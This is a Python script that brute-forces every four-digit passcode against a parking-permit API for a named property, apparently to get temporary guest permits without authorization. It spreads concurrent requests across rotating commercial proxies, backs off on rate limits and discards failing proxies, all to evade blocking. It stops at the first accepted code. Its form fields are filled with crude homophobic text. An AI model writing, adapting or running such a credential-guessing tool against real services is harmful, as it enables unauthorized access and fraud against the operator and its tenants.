import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
import json
import random

# ================= Configuration Area =================
# Add your proxies here. Format: "http://ip:port" or "http://user:pass@ip:port"
# Leave empty to use your native connection.
PROXY_LIST = [
    # Oxylabs dedicated datacenter proxies
    "http://abc@dc.oxylabs.io:8001",
    "http://abc@dc.oxylabs.io:8002"
]
# Your target address configuration: each target contains Site ID and Policy ID
TARGETS = [
    {
        "name": "Site_A",
        "site_id": "k564q1ekn15p9dyg0a57xrm178",
        "policy_id": "vrx2zeq3515h56pkzg02kjy9kc",
        "base_url": "https://levity.parkingattendant.com"
    },
    # You can add more targets below...
    # { "name": "Site_B", "site_id": "...", "policy_id": "...", ... }
]

# Global Configuration
SESSION = requests.Session()
SESSION.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Content-Type': 'application/json',
    'Accept': 'application/json'
})
LOCK = threading.Lock()  # Used for thread-safe printing of results
RESULTS = []  # Store results here
PROXY_FAILURES = {}  # Track how many times each proxy fails

def generate_codes():
    """Generate a dictionary of codes from 0000-9999"""
    return [f"{i:04d}" for i in range(10000)]

def validate_code(target, code):
    """
    Core validation function: submits the code to the API and returns the result
    """
    # We learned the true API endpoint is api.propertyboss.io
    url = f"https://api.propertyboss.io/v1/permits/temporary"
    
    # The true shape of the multipart/form-data payload, verified by the network tab
    payload = {
        "location": target['site_id'],
        "policy": target['policy_id'],
        "vehicle": "GAY876",
        "tenant": "xxx Drive",
        "token": code,
        "space": "GUEST/VISITOR",
        "duration": "PT24H",
        "notes": "BMW",
        "name": "Gay Park",
        "email": "iamgay@gmail.com",
        "tel": "9092849078"
    }

    max_retries = 5
    for attempt in range(max_retries):
        proxy = None
        try:
            # Per-request delay to prevent IP blocking (adjust as needed)
            time.sleep(0.5)
            
            # Select random proxy if available
            req_proxies = None
            if PROXY_LIST:
                with LOCK:
                    if PROXY_LIST: # Check again inside lock to be safe
                        proxy = random.choice(PROXY_LIST)
                if proxy:
                    req_proxies = {"http": proxy, "https": proxy}
            
            # Send the request as multipart/form-data with query params mirroring payload
            response = SESSION.post(url, data=payload, params=payload, timeout=5, proxies=req_proxies)
            
            # If server throws 429 Too Many Requests, sleep longer and retry
            if response.status_code == 429:
                print(f"⚠️ Rate limited (429) on {code}. Backing off for 10 seconds...")
                time.sleep(10)
                continue
            
            # Determine success logic based on the observed 401 response for bad passwords
            is_success = False
            if response.status_code == 200 or response.status_code == 201:
                is_success = True
            
            return {
                "target": target['name'],
                "code": code,
                "success": is_success,
                "status_code": response.status_code,
                "message": "Matched!" if is_success else "Invalid passcode"
            }
            
        except Exception as e:
            # Handle proxy failure explicitly
            if proxy:
                with LOCK:
                    if proxy in PROXY_LIST:
                        PROXY_FAILURES[proxy] = PROXY_FAILURES.get(proxy, 0) + 1
                        if PROXY_FAILURES[proxy] >= 2:
                            print(f"🗑️ Proxy {proxy} failed 2 times. Disabling it.")
                            PROXY_LIST.remove(proxy)

            # If we've exhausted all 5 retries for this code, mark as failed
            if attempt == max_retries - 1:
                return {"target": target['name'], "code": code, "success": False, "error": str(e)}
            
            # Pause before retrying with a NEW proxy
            time.sleep(1)

def run_brute_force(targets, codes, max_workers=5):
    """
    Main multi-threaded brute force program
    max_workers: Number of concurrent threads, adjust based on network conditions (suggested 5-10)
    """
    print(f"Starting brute force... Total {len(targets)} targets, traversing code range 0000-9999")
    
    # Create the task list: each target needs to attempt 10000 codes
    tasks = []
    for target in targets:
        for code in codes:
            tasks.append((target, code))

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit tasks
        future_to_task = {executor.submit(validate_code, t, c): (t, c) for t, c in tasks}
        
        for future in as_completed(future_to_task):
            result = future.result()
            
            with LOCK:
                RESULTS.append(result)
                if result['success']:
                    print(f"✅ [SUCCESS] Target: {result['target']} | Code: {result['code']}")
                    
                    # Stop checking other codes
                    print("🛑 Stopping remaining tasks due to success...")
                    executor.shutdown(wait=False, cancel_futures=True)
                    break 
                else:
                    if 'error' in result:
                        print(f"🔴 [NETWORK ERROR] Code: {result['code']} | Error: {result['error']}")
                    else:
                        print(f"❌ [DENIED] Code: {result['code']} | Status: {result['status_code']} | Response: {result['message']}")
            
            # Print progress every 10 attempts
            if len(RESULTS) % 10 == 0:
                print(f"--- Progress: {len(RESULTS)}/{len(tasks)} checked ---")

    end_time = time.time()
    print(f"Done! Total time elapsed: {end_time - start_time:.2f} seconds")

if __name__ == "__main__":
    # Run against all 10,000 generated codes
    codes = generate_codes()
    run_brute_force(targets=TARGETS, codes=codes, max_workers=5)
